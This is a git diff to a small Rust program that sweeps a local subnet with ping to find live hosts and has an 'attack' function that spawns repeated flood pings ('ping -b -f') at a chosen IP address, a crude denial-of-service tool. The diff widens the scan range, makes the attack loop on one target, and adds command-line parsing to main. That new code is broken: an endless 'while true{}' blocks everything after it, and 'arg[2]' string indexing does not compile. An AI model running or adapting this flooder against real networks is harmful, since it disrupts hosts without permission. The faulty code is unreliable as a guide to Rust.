@@ -3,19 +3,11 @@ use std::fs::OpenOptions;
 use std::io::{self, Write};
 use std::thread;
 use std::time::Duration;
+use std::env;
 
 fn scan(gatw: &str){
-    let mut ipa = Vec::new();
-    let mut i = 1;
-    let mut gatw = String::new();
-
-    println!("Enter the gateway (192.168.0.): ");
-    io::stdin()
-        .read_line(&mut gatw)
-        .expect("Failed to read line");
-    let gatw = gatw.trim();
-
-    while i < 40 {
+    
+    for i in 1..255 {
         let host = format!("{}{}", gatw, i);
         let output = Command::new("ping")
             .arg("-s")
@@ -30,21 +22,20 @@ fn scan(gatw: &str){
 
         if output.status.success() {
             println!("[{}] is alive", host);
-            ipa.push(host);
         }
-        i += 1;
         thread::sleep(Duration::from_millis(50));
     }
 }
 
 fn attack(ip: &str, count: i32){
-    for j in ipa {
+    let host = format!("{}", ip);
+    for i in 1..count {
 	Command::new("ping")
 	    .arg("-b")
             .arg("-f")
             .arg("-i")
             .arg("2")
-            .arg(&j)
+            .arg(&host)
             .spawn()
             .expect("Failed to execute ping command");
     }
@@ -64,4 +55,22 @@ fn save_to_file(){
 }
 
 fn main() {
+    let args: Vec<String> = env::args().collect(); // Get arguments
+    // Verify if there are arguments
+    while true{} // Check this latter...
+    if args.len() >= 2 {
+	for arg in &args[1..] {
+	    if arg.as_str() == "scan"{
+		let gateway: String = arg[2];
+	    }
+	    else if arg.as_str() == "attack"{
+		let ipattaked: String = arg[2];
+	    }
+	    else if arg.as_str() == "save"{
+		let gateway: String = arg[2];
+	    }
+	    else{println!("Please use an arg...")}
+	}
+	return;
+    }
 }
